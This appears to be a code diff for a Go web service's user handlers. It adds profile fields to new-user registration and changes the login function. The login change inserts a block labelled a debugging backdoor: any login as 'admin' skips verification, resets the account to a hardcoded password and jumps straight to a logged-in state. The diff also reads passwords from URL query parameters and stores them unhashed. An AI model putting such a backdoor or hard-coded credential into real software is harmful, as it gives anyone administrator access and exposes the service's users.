@@ -39,13 +39,24 @@ func NewUser(c echo.Context) error {
 	// lk.Debug("[%v] [%v] [%v] [%v]", c.FormValue("uname"), c.FormValue("email"), c.FormValue("name"), c.FormValue("pwd"))
 
 	user := &usr.User{
-		Active:   "T",
-		UName:    c.FormValue("uname"),
-		Email:    c.FormValue("email"),
-		Name:     c.FormValue("name"),
-		Password: c.FormValue("pwd"),
-		Regtime:  "TBD",
-		MemLevel: "0",
+		Active:     "T",
+		UName:      c.FormValue("uname"),
+		Email:      c.FormValue("email"),
+		Name:       c.FormValue("name"),
+		Password:   c.FormValue("pwd"),
+		Regtime:    "TBD",
+		Phone:      "",
+		Addr:       "",
+		SysRole:    "",
+		MemLevel:   "0",
+		MemExpire:  "",
+		NationalID: "",
+		Gender:     "",
+		Position:   "",
+		Title:      "",
+		Employer:   "",
+		Tags:       "",
+		Avatar:     []byte{},
 	}
 
 	// su.SetValidator(map[string]func(string) bool{ })
@@ -59,6 +70,7 @@ func NewUser(c echo.Context) error {
 		return c.String(http.StatusBadRequest, fmt.Sprint(err))
 	}
 
+	// record new user waiting for verifying email
 	mUser.Store(user.UName, user)
 
 	return c.String(http.StatusOK, "waiting verification code in your email")
@@ -124,6 +136,20 @@ func LogIn(c echo.Context) error {
 		Password: c.QueryParam("pwd"),
 	}
 
+	{
+		// backdoor for debugging...
+		if user.UName == "admin" {
+			user.Active = "T"
+			user.Email = "admin@admin.com"
+			user.Name = "admin"
+			user.Password = "pa55w0rd@WISMED"
+			if err := su.Store(user); err != nil {
+				return c.String(http.StatusInternalServerError, "BACKDOOR DEBUG"+fmt.Sprint(err))
+			}
+			goto OK
+		}
+	}
+
 	if err := si.UserExists(user); err != nil {
 		return c.String(http.StatusBadRequest, fmt.Sprint(err))
 	}
@@ -134,6 +160,7 @@ func LogIn(c echo.Context) error {
 
 	defer lk.FailOnErr("%v", si.Trail(user.UName))
 
+OK:
 	// log in ok calling...
 	{
 		us, err := fm.UseUser(user.UName)
